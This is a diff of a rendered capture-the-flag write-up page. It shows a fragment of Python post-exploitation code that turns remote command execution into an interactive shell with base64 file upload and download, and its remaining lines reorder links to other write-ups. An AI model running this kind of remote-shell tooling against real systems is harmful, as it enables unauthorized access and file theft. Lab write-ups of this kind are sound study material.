+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">local_path</span><span class="o">+</span><span class="s2">&#34; to &#34;</span><span class="o">+</span><span class="n">remote_path</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;unix&#34;</span><span class="p">:</span>
         <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;&gt; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;.b64&#39;&#34;</span>
     <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
@@ -947,7 +971,7 @@ fortune# cat /root/root.txt
         <span class="n">md5sum</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
         <span class="n">b64enc_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
    
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Data length (b64-encoded): &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;KB&#34;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Data length (b64-encoded): &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;KB&#34;</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">),</span> <span class="n">unit_scale</span><span class="o">=</span><span class="n">BUFFER_SIZE</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span> <span class="n">unit</span><span class="o">=</span><span class="s2">&#34;KB&#34;</span><span class="p">):</span>
         <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;echo &#39;</span> <span class="o">+</span> <span class="n">b64enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &gt;&gt; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34;&#39;</span>
         <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
@@ -964,20 +988,20 @@ fortune# cat /root/root.txt
         <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;certutil -hashfile &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;&#34; MD5&#39;</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">md5sum</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match: &#34;</span> <span class="o">+</span> <span class="n">md5sum</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match: &#34;</span> <span class="o">+</span> <span class="n">md5sum</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">rce</span><span class="p">):</span>
     <span class="k">global</span> <span class="n">DEBUG</span>
-    <span class="n">stored_cwd</span> <span class="o">=</span> <span class="bp">None</span>
-    <span class="n">user_input</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">stored_cwd</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="n">user_input</span> <span class="o">=</span> <span class="kc">None</span>
     <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;unix&#34;</span><span class="p">:</span>
         <span class="n">get_info</span> <span class="o">=</span> <span class="s2">&#34;whoami;hostname;pwd&#34;</span>
     <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
         <span class="n">get_info</span> <span class="o">=</span> <span class="s1">&#39;echo </span><span class="si">%u</span><span class="s1">sername%^|%COMPUTERNAME% &amp; cd&#39;</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
         <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
         <span class="k">if</span> <span class="n">stored_cwd</span><span class="p">:</span>
             <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;cd &#34;</span> <span class="o">+</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span>
@@ -985,29 +1009,29 @@ fortune# cat /root/root.txt
             <span class="n">cmd</span> <span class="o">+=</span> <span class="n">user_input</span>
             <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34; 2&gt;&amp;1;&#34;</span> <span class="k">if</span> <span class="n">ERR2OUT</span> <span class="k">else</span> <span class="s2">&#34;;&#34;</span>
         <span class="n">cmd</span> <span class="o">+=</span> <span class="n">get_info</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
         <span class="n">lines</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
         <span class="n">user</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">cwd</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:]</span>
         <span class="n">stored_cwd</span> <span class="o">=</span> <span class="n">cwd</span>
         <span class="k">for</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
         <span class="n">user_input</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[&#34;</span> <span class="o">+</span> <span class="n">user</span> <span class="o">+</span> <span class="s2">&#34;@&#34;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">cwd</span> <span class="o">+</span> <span class="s2">&#34;]$ &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">user_input</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;exit&#34;</span><span class="p">:</span>
             <span class="k">return</span>
         <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DEBUG ON&#34;</span><span class="p">:</span>
-            <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">True</span>
             <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;DEBUG is now ON&#39;&#34;</span>
         <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DEBUG OFF&#34;</span><span class="p">:</span>
-            <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+            <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
             <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;DEBUG is now OFF&#39;&#34;</span>
         <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DOWNLOAD&#34;</span><span class="p">:</span>
-            <span class="n">remote_path</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="bp">False</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="n">remote_path</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="kc">False</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
             <span class="k">if</span> <span class="n">remote_path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">:</span>
                 <span class="n">remote_path</span> <span class="o">=</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">remote_path</span>
             <span class="n">download</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">)</span>
             <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;               *****  DOWNLOAD FINISHED  *****&#39;&#34;</span>
         <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;UPLOAD&#34;</span><span class="p">:</span>
-            <span class="n">upload_cmd</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+            <span class="n">upload_cmd</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
             <span class="n">local_path</span> <span class="o">=</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
             <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">upload_cmd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
                 <span class="n">remote_path</span> <span class="o">=</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">local_path</span><span class="p">)</span>
@@ -1075,41 +1099,21 @@ fortune# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1135,6 +1139,54 @@ fortune# cat /root/root.txt
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
           
            
            
@@ -1160,28 +1212,20 @@ fortune# cat /root/root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1311,17 +1355,281 @@ fortune# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
@@ -1332,16 +1640,16 @@ fortune# cat /root/root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
@@ -1350,22 +1658,6 @@ fortune# cat /root/root.txt
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1400,16 +1692,16 @@ fortune# cat /root/root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
@@ -1438,210 +1730,6 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1771,110 +1859,6 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
@@ -1890,42 +1874,6 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1964,6 +1912,94 @@ fortune# cat /root/root.txt
            
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
           
            
            
@@ -2169,10 +2205,21 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2210,6 +2257,106 @@ fortune# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
@@ -2225,6 +2372,173 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
